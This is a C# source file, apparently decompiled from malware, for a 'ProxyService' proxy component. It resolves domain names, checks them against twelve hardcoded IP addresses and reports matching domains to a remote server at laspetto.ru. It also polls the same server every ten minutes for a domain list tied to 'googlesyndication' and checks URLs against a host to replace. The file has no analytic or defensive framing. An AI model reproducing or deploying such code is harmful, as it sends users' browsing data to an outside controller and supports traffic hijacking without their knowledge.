using System;
using System.Collections;
using System.Net;
using System.Threading;

namespace ProxyService;

public class resolve
{
	public const string DNSServer = "46.173.209.194";

	private const int sleepy = 50;

	public static ArrayList iplook = new ArrayList();

	private static int addIndex = 0;

	private static int jobIndex = 0;

	public static ArrayList list = new ArrayList();

	public static Thread thJob;

	public static ArrayList domsCol = new ArrayList();

	public static Thread thDomainsLoader;

	public static void SafeAdd(string rnd)
	{
		try
		{
			bool flag = true;
			for (int i = 0; i <= list.Count - 1; i++)
			{
				string text = list[i]!.ToString();
				if (text == rnd)
				{
					flag = false;
					break;
				}
			}
			if (flag)
			{
				list.Add(rnd);
				addIndex++;
			}
		}
		catch (Exception ex)
		{
			ProxyServer.dbg("add_error: " + ex.Message);
		}
	}

	public static void JobStart()
	{
		ThreadStart start = JobGo;
		thJob = new Thread(start);
		thJob.Start();
	}

	public static void JobGo()
	{
		while (true)
		{
			try
			{
				while (jobIndex < addIndex)
				{
					try
					{
						string text = list[jobIndex]!.ToString();
						IPAddress[] array = new IPAddress[0];
						try
						{
							array = Dns.GetHostAddresses(text);
						}
						catch (Exception)
						{
						}
						IPAddress[] array2 = array;
						foreach (IPAddress iPAddress in array2)
						{
							foreach (string item in iplook)
							{
								if (item == iPAddress.ToString())
								{
									vkbill.DownloadURL("http://www.laspetto.ru/adddomain.aspx?domain=" + text);
								}
							}
						}
					}
					catch (Exception)
					{
					}
					jobIndex++;
					Thread.Sleep(50);
				}
			}
			catch (Exception)
			{
			}
			Thread.Sleep(50);
		}
	}

	public static void Start()
	{
		iplook.Add("37.220.26.131");
		iplook.Add("78.140.138.147");
		iplook.Add("88.85.93.35");
		iplook.Add("184.168.221.66");
		iplook.Add("184.168.174.55");
		iplook.Add("46.165.197.231");
		iplook.Add("95.169.187.139");
		iplook.Add("89.108.74.61");
		iplook.Add("89.108.72.63");
		iplook.Add("195.234.99.231");
		iplook.Add("91.220.101.115");
		iplook.Add("62.212.72.238");
		JobStart();
	}

	private static void loadDomainsFromServer()
	{
		ThreadStart start = loadDoms;
		thDomainsLoader = new Thread(start);
		thDomainsLoader.Start();
	}

	private static void loadDoms()
	{
		string text = "";
		while (true)
		{
			if (!text.Contains("googlesyndication"))
			{
				text = vkbill.DownloadURL("http://laspetto.ru/list.aspx");
				if (text.Contains("googlesyndication"))
				{
					break;
				}
				Thread.Sleep(600000);
				continue;
			}
			return;
		}
		string[] array = text.Split("<BR>".ToCharArray());
		if (array.Length >= 1)
		{
			string[] array2 = array;
			foreach (string text2 in array2)
			{
				string text3 = text2.Trim().ToLower();
				text3.Contains(".");
			}
		}
		domsCol.Add("my.com");
		domsCol.Sort();
	}

	public static bool ReplaceHost(string url)
	{
		if (url.Contains("my.com"))
		{
			return true;
		}
		return false;
	}
}
